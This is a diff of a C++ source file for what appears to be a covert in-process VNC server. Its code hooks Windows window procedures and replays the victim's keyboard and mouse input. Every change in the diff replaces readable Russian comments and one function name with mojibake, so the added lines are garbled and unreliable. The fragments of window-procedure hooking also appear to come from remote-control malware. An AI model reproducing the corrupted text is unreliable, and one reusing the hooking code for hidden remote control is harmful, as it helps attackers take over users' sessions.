@@ -22,22 +22,22 @@
 #include "..\..\common\fs.h"
 
 /*
-  ИЗВЕСТНЫЕ ПРОБЛЕМЫ:
-  1. Z-нижнее окно должно прорисовываться поверх z-верхнего окна (пример, NSIS 2.x).
-     Проблему решить можно, но будет затрачено много CPU. Я так понел, когда прорисовывается верхнее
-     окно, система сразу после него, отправляет прорисовку окнам, которые оно перекрывает...
+  РР—Р’Р•РЎРўРќР«Р• РџР РћР‘Р›Р•РњР«:
+  1. Z-РЅРёР¶РЅРµРµ РѕРєРЅРѕ РґРѕР»Р¶РЅРѕ РїСЂРѕСЂРёСЃРѕРІС‹РІР°С‚СЊСЃСЏ РїРѕРІРµСЂС… z-РІРµСЂС…РЅРµРіРѕ РѕРєРЅР° (РїСЂРёРјРµСЂ, NSIS 2.x).
+     РџСЂРѕР±Р»РµРјСѓ СЂРµС€РёС‚СЊ РјРѕР¶РЅРѕ, РЅРѕ Р±СѓРґРµС‚ Р·Р°С‚СЂР°С‡РµРЅРѕ РјРЅРѕРіРѕ CPU. РЇ С‚Р°Рє РїРѕРЅРµР», РєРѕРіРґР° РїСЂРѕСЂРёСЃРѕРІС‹РІР°РµС‚СЃСЏ РІРµСЂС…РЅРµРµ
+     РѕРєРЅРѕ, СЃРёСЃС‚РµРјР° СЃСЂР°Р·Сѓ РїРѕСЃР»Рµ РЅРµРіРѕ, РѕС‚РїСЂР°РІР»СЏРµС‚ РїСЂРѕСЂРёСЃРѕРІРєСѓ РѕРєРЅР°Рј, РєРѕС‚РѕСЂС‹Рµ РѕРЅРѕ РїРµСЂРµРєСЂС‹РІР°РµС‚...
   
-  2. Также не обрабатываются clipping-регионы, т.к. это дополнительный расход CPU.
+  2. РўР°РєР¶Рµ РЅРµ РѕР±СЂР°Р±Р°С‚С‹РІР°СЋС‚СЃСЏ clipping-СЂРµРіРёРѕРЅС‹, С‚.Рє. СЌС‚Рѕ РґРѕРїРѕР»РЅРёС‚РµР»СЊРЅС‹Р№ СЂР°СЃС…РѕРґ CPU.
 
-  3. Фоновое окно InstallShield порисовывается, хотя оно как-то хитро скрыто... (пример, установщик ICQ7)
+  3. Р¤РѕРЅРѕРІРѕРµ РѕРєРЅРѕ InstallShield РїРѕСЂРёСЃРѕРІС‹РІР°РµС‚СЃСЏ, С…РѕС‚СЏ РѕРЅРѕ РєР°Рє-С‚Рѕ С…РёС‚СЂРѕ СЃРєСЂС‹С‚Рѕ... (РїСЂРёРјРµСЂ, СѓСЃС‚Р°РЅРѕРІС‰РёРє ICQ7)
 
-  4. Естественно не рисуются крутые окна типа WinAmp, некторые глючат (ICQ7).
+  4. Р•СЃС‚РµСЃС‚РІРµРЅРЅРѕ РЅРµ СЂРёСЃСѓСЋС‚СЃСЏ РєСЂСѓС‚С‹Рµ РѕРєРЅР° С‚РёРїР° WinAmp, РЅРµРєС‚РѕСЂС‹Рµ РіР»СЋС‡Р°С‚ (ICQ7).
 
-  5. В посьянсе свободная ячейка, в WM_PAINT рисует в неклинетскую область, оюдмуать ка крешить эту проблему.
+  5. Р’ РїРѕСЃСЊСЏРЅСЃРµ СЃРІРѕР±РѕРґРЅР°СЏ СЏС‡РµР№РєР°, РІ WM_PAINT СЂРёСЃСѓРµС‚ РІ РЅРµРєР»РёРЅРµС‚СЃРєСѓСЋ РѕР±Р»Р°СЃС‚СЊ, РѕСЋРґРјСѓР°С‚СЊ РєР° РєСЂРµС€РёС‚СЊ СЌС‚Сѓ РїСЂРѕР±Р»РµРјСѓ.
   
   FIXME:
-    Изменение разрещения и палитры.
-    Блокировать звук.
+    РР·РјРµРЅРµРЅРёРµ СЂР°Р·СЂРµС‰РµРЅРёСЏ Рё РїР°Р»РёС‚СЂС‹.
+    Р‘Р»РѕРєРёСЂРѕРІР°С‚СЊ Р·РІСѓРє.
     Dead chars
   
 */
@@ -46,42 +46,42 @@
 VNCPROCESSDATA vncActiveProcessData; //Filled only when (coreData.proccessFlags & Core:: CDPF_VNC_ACTIVE).
 
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
-//В Fitting for a window class.
+//Р’В Fitting for a window class.
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 const static struct {LPWSTR windowClass; int windowClassLenght; WORD method;} winowPrintTypes[] =
 {
   /*
-    Тень окна. Она не нужна.
+    РўРµРЅСЊ РѕРєРЅР°. РћРЅР° РЅРµ РЅСѓР¶РЅР°.
   */
   {L"SysShadow",           9, WCF_PAINTMETHOD_NOP},                                     
   
   /*
-    Меню, не удалось установить перехват, видемо в результате оптимизации, вызывается что-то
-    внутреннее.
+    РњРµРЅСЋ, РЅРµ СѓРґР°Р»РѕСЃСЊ СѓСЃС‚Р°РЅРѕРІРёС‚СЊ РїРµСЂРµС…РІР°С‚, РІРёРґРµРјРѕ РІ СЂРµР·СѓР»СЊС‚Р°С‚Рµ РѕРїС‚РёРјРёР·Р°С†РёРё, РІС‹Р·С‹РІР°РµС‚СЃСЏ С‡С‚Рѕ-С‚Рѕ
+    РІРЅСѓС‚СЂРµРЅРЅРµРµ.
 
-    Также по неизвестной причине, все сообшения мыши для HTCLIENT идут с координатами отностиельно
-    экрана.
+    РўР°РєР¶Рµ РїРѕ РЅРµРёР·РІРµСЃС‚РЅРѕР№ РїСЂРёС‡РёРЅРµ, РІСЃРµ СЃРѕРѕР±С€РµРЅРёСЏ РјС‹С€Рё РґР»СЏ HTCLIENT РёРґСѓС‚ СЃ РєРѕРѕСЂРґРёРЅР°С‚Р°РјРё РѕС‚РЅРѕСЃС‚РёРµР»СЊРЅРѕ
+    СЌРєСЂР°РЅР°.
   */
   {L"#32768",              6, WCF_PAINTMETHOD_PRINTWINDOW | WCF_MOUSE_CLIENT_TO_SCREEN | WCF_MOUSE_AUTOCAPTURE},
   
   /*
-    Коносльное окно, создается сервисом.
+    РљРѕРЅРѕСЃР»СЊРЅРѕРµ РѕРєРЅРѕ, СЃРѕР·РґР°РµС‚СЃСЏ СЃРµСЂРІРёСЃРѕРј.
   */
   {L"ConsoleWindowClass", 18, WCF_PAINTMETHOD_PRINTWINDOW | WCF_PAINTMETHOD_SKIP_HOOK},
 
   /*
-    Языковая панель. Причина проблемы не известна.
+    РЇР·С‹РєРѕРІР°СЏ РїР°РЅРµР»СЊ. РџСЂРёС‡РёРЅР° РїСЂРѕР±Р»РµРјС‹ РЅРµ РёР·РІРµСЃС‚РЅР°.
   */
   {L"CiceroUIWndFrame",   16, WCF_PAINTMETHOD_PRINTWINDOW | WCF_PAINTMETHOD_SKIP_HOOK},
 
   /*
-    MDIClient. Причина проблемы не известна.
+    MDIClient. РџСЂРёС‡РёРЅР° РїСЂРѕР±Р»РµРјС‹ РЅРµ РёР·РІРµСЃС‚РЅР°.
   */
   {L"MDIClient",           9, WCF_PAINTMETHOD_PRINTWINDOW | WCF_PAINTMETHOD_SKIP_HOOK},
 
   /*
-    Вылетает в Seven. Причина проблемы не известна.
+    Р’С‹Р»РµС‚Р°РµС‚ РІ Seven. РџСЂРёС‡РёРЅР° РїСЂРѕР±Р»РµРјС‹ РЅРµ РёР·РІРµСЃС‚РЅР°.
   */
   {L"SysListView32",      13, WCF_PAINTMETHOD_PRINT},
 };
@@ -103,17 +103,17 @@ WORD getWindowClassFlags(HWND window)
 }
 
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
-//В Utilities.
+//Р’В Utilities.
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 /*
-  Инициализация vncProcessData. freeVncProcessData() должна быть вызвона в не зависимости от Return.
+  РРЅРёС†РёР°Р»РёР·Р°С†РёСЏ vncProcessData. freeVncProcessData() РґРѕР»Р¶РЅР° Р±С‹С‚СЊ РІС‹Р·РІРѕРЅР° РІ РЅРµ Р·Р°РІРёСЃРёРјРѕСЃС‚Рё РѕС‚ Return.
 
   OUT vncProcessData - VNCPROCESSDATA.
-  IN isServer        - создавать серверные объекты.
+  IN isServer        - СЃРѕР·РґР°РІР°С‚СЊ СЃРµСЂРІРµСЂРЅС‹Рµ РѕР±СЉРµРєС‚С‹.
   
-  Return             - true - в случи успеха,
-                       false - в случаи проблемы.
+  Return             - true - РІ СЃР»СѓС‡Рё СѓСЃРїРµС…Р°,
+                       false - РІ СЃР»СѓС‡Р°Рё РїСЂРѕР±Р»РµРјС‹.
 */
 static bool createVncProcessData(VNCPROCESSDATA *vncProcessData, bool isServer)
 {
@@ -214,10 +214,10 @@ static bool createVncProcessData(VNCPROCESSDATA *vncProcessData, bool isServer)
 }
 
 /*
-  Освобождение vncProcessData.
+  РћСЃРІРѕР±РѕР¶РґРµРЅРёРµ vncProcessData.
 
   OUT vncProcessData - VNCPROCESSDATA.
-  IN isServer        - освобождать серверные объекты.
+  IN isServer        - РѕСЃРІРѕР±РѕР¶РґР°С‚СЊ СЃРµСЂРІРµСЂРЅС‹Рµ РѕР±СЉРµРєС‚С‹.
 */
 static void freeVncProcessData(VNCPROCESSDATA *vncProcessData, bool isServer)
 {
@@ -342,7 +342,7 @@ void VncServer::uninit(void)
 }
 
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
-//В Server.
+//Р’В Server.
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 static void onSecurityType(void *param, LPDWORD securityType, LPSTR *errorMessage)
@@ -367,7 +367,7 @@ static HDC onServerInit(void *param, LPSTR *name, POINT *size)
   return vncProcessData->serverData.dcData.dc;
 }
 
-static void onUpdateDс(void *param)
+static void onUpdateDСЃ(void *param)
 {
   VNCPROCESSDATA *vncProcessData = (VNCPROCESSDATA *)param;
   paintDesktop(vncProcessData);
@@ -456,7 +456,7 @@ bool VncServer::start(SOCKET s)
     sc.onSecurityType    = onSecurityType;
     sc.onClientInit      = onClientInit;
     sc.onServerInit      = onServerInit;
-    sc.OnUpdateDC        = onUpdateDс;
+    sc.OnUpdateDC        = onUpdateDСЃ;
     sc.onKeyEvent        = onKeyEvent;
     sc.OnPointerEvent    = onPointerEvent;
     sc.OnClientCutText   = onClientCutText;
@@ -470,7 +470,7 @@ bool VncServer::start(SOCKET s)
 }
 
 /*
-  Обработка VNC-сообщения.().
+  РћР±СЂР°Р±РѕС‚РєР° VNC-СЃРѕРѕР±С‰РµРЅРёСЏ.().
 */
 static LRESULT vncMessage(HWND window, WPARAM wParam, LPARAM lParam)
 {
@@ -629,11 +629,11 @@ LRESULT WINAPI VncServer::hookerCallWindowProcA(WNDPROC prevWndFunc, HWND window
   return CWA(user32, CallWindowProcA)(prevWndFunc, window, msg, wParam, lParam);
 }
 
-/*В В Replacement Def * Proc on a hook.
+/*Р’В Р’В Replacement Def * Proc on a hook.
 
-В В IN p - address for verification.
+Р’В Р’В IN p - address for verification.
 
-В В Return - address hook - if the hook is found. NULL - the hook is not found.*/
+Р’В Р’В Return - address hook - if the hook is found. NULL - the hook is not found.*/
 static void *replaceDefProc(void *p)
 {
   if(p == CWA(user32, DefWindowProcW))return VncServer::hookerDefWindowProcW;
